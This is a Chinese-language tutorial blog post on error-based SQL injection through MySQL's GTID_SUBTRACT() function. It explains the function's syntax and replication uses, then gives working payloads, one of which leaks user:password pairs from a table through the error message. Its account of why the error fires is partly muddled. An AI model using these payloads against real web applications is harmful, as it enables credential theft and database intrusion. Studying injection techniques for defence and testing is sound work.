# 原创
：  【sql注入-报错注入2】GTID_SUBTRACT()函数 报错注入

# 【sql注入-报错注入2】GTID_SUBTRACT()函数 报错注入

**目录**

[GTID_SUBTRACT()报错注入](#extractvalue%28%29%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5)

[一、语法介绍：](#%E4%B8%80%E3%80%81%E8%AF%AD%E6%B3%95%E4%BB%8B%E7%BB%8D%EF%BC%9A)

[二、报错原因](#%E4%BA%8C%E3%80%81%E6%8A%A5%E9%94%99%E5%8E%9F%E5%9B%A0)

[网络安全小圈子](#%E4%B8%89%E3%80%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B0%8F%E5%9C%88%E5%AD%90)

---


（***注：注意看版本要求）

## GTID_SUBTRACT()报错注入

### 一、语法介绍：

版本：

MySQL &gt;=5.6

GTID_SUBTRACT()函数是MySQL中的一个函数，用于计算两个全局事务标识符（GTID）之间的差异。GTID是MySQL 5.6版本引入的一种全局事务标识符，用于跟踪数据库中的事务

---


语法：

```
GTID_SUBTRACT(gtid_set, gtid)
```

其中，gtid_set是一个GTID集合，gtid是一个单独的GTID。该函数返回一个新的GTID集合，表示从gtid_set中减去gtid后的剩余部分

---


原理：
1. 首先，将gtid_set拆分成一个个单独的GTID。1. 然后，遍历每个GTID，检查它是否与gtid相同。如果相同，则将其从gtid_set中移除。1. 最后，将剩余的GTID重新组合成一个新的GTID集合返回
---


使用场景：
1. 数据库复制：在主数据库上执行事务时，会生成一个GTID，并将其传递给从数据库。从数据库可以使用GTID_SUBTRACT()函数来计算主数据库和从数据库之间的差异，以确定需要复制的数据。1. 数据库迁移：当需要将数据从一个数据库迁移到另一个数据库时，可以使用GTID_SUBTRACT()函数来计算两个数据库之间的差异，并只复制差异部分的数据
---


---


### 二、报错原因

产生原因：

1、GTID（全局事务标识）是MySQL中用于标识全局事务的唯一标识符

2、GTID_SUBTRACT()函数可以用于计算两个GTID集合的差异，以确定哪些事务在一个GTID集合中存在，但在另一个GTID集合中不存在

3、在gtid_set1或gtid_set2参数中注入恶意的SQL代码。这样，当GTID_SUBTRACT()函数执行时，恶意代码会被执行

---


payload：

```
select GTID_SUBTRACT(user(),1)

') or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from 表名),0x7e),1)--+

//GROUP_CONCAT()函数将它们组合成一个字符串
//concat()函数用于连接字符串
//0x7e表示波浪符（~）

```

---


图示：

root@localhost

 

---


---


## 网络安全小圈子

[README.md · 书半生/网络安全知识体系-实战中心 - 码云 - 开源中国 (gitee.com)https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md<img alt="icon-default.png?t=N658" src="https://csdnimg.cn/release/blog_editor_html/release2.3.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N658"/>https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md](https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md)

[GitHub - BLACKxZONE/Treasure_knowledge<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.3.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N5K3"/>https://github.com/BLACKxZONE/Treasure_knowledge](https://github.com/BLACKxZONE/Treasure_knowledge)
